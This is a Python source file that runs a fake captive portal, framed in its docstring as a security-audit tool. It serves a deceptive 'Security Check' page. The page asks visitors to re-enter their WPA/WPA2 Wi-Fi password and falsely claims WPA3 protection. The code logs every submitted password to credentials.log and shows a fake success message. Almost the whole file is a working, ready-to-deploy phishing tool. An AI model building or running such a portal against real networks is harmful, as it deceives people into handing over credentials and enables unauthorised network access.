"""
portal.py - Captive Portal Server
Hosts a fake login page to capture credentials during security audits.
"""

import http.server
import socketserver
import threading
from rich.console import Console

console = Console()

PORTAL_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Authentication Required</title>
    <style>
        :root {
            --primary: #2563eb;
            --bg: #0f172a;
            --card: #1e293b;
            --text: #f1f5f9;
        }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background: var(--bg); 
            color: var(--text);
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; margin: 0; padding: 20px;
        }
        .container { 
            background: var(--card); 
            padding: 40px 30px; border-radius: 16px; 
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); 
            width: 100%; max-width: 380px; 
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .icon {
            font-size: 48px; margin-bottom: 20px; display: inline-block;
            background: rgba(37, 99, 235, 0.1);
            width: 80px; height: 80px; line-height: 80px; border-radius: 50%;
            color: var(--primary);
        }
        h2 { margin: 0 0 10px; font-size: 24px; font-weight: 700; }
        p { color: #94a3b8; line-height: 1.5; margin-bottom: 30px; font-size: 15px; }
        
        .form-group { text-align: left; margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; }
        
        input { 
            width: 100%; padding: 14px; 
            background: #0f172a; border: 1px solid #334155; 
            border-radius: 8px; color: white; font-size: 16px;
            box-sizing: border-box; transition: border-color 0.2s;
        }
        input:focus { outline: none; border-color: var(--primary); }
        
        button { 
            width: 100%; padding: 14px; 
            background: var(--primary); color: white; 
            border: none; border-radius: 8px; 
            font-weight: 600; font-size: 16px; cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
        }
        button:hover { opacity: 0.9; }
        button:active { transform: scale(0.98); }

        .security-note {
            margin-top: 30px; font-size: 12px; color: #475569;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .badge {
            display: inline-block; width: 8px; height: 8px; 
            background: #22c55e; border-radius: 50%;
            box-shadow: 0 0 8px #22c55e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🛡️</div>
        <h2>Security Check</h2>
        <p>A recent security update requires you to re-verify your network credentials to maintain a secure connection.</p>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label>WPA/WPA2 Password</label>
                <input type="password" name="password" placeholder="••••••••" required autofocus>
            </div>
            <button type="submit">Verify & Reconnect</button>
        </form>
        
        <div class="security-note">
            <span class="badge"></span> Protected by WPA3 Encryption Standards
        </div>
    </div>
</body>
</html>
"""

class PortalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        
        console.print(f"\n[bold red]🚩 ALERT: Credential Captured![/]")
        console.print(f"[yellow]Data sent: {post_data}[/]\n")
        
        # Persistent Logging
        with open("credentials.log", "a") as f:
            from datetime import datetime
            f.write(f"[{datetime.now()}] {post_data}\n")
        
        # Success page
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write("<b>Connection successful. Please wait 5 minutes.</b>".encode())

    def log_message(self, format, *args):
        # Silent logs for cleaner UI
        return

class CaptivePortal:
    def __init__(self, port=80):
        self.port = port
        self.server = None

    def start(self):
        def run_server():
            try:
                with socketserver.TCPServer(("", self.port), PortalHandler) as httpd:
                    self.server = httpd
                    console.print(f"[bold green]🌐 Captive Portal active on port {self.port}[/]")
                    httpd.serve_forever()
            except Exception as e:
                console.print(f"[red]Portal Error: {e}[/]")

        threading.Thread(target=run_server, daemon=True).start()

    def stop(self):
        if self.server:
            self.server.shutdown()
            console.print("[yellow]⏹ Captive Portal stopped.[/]")
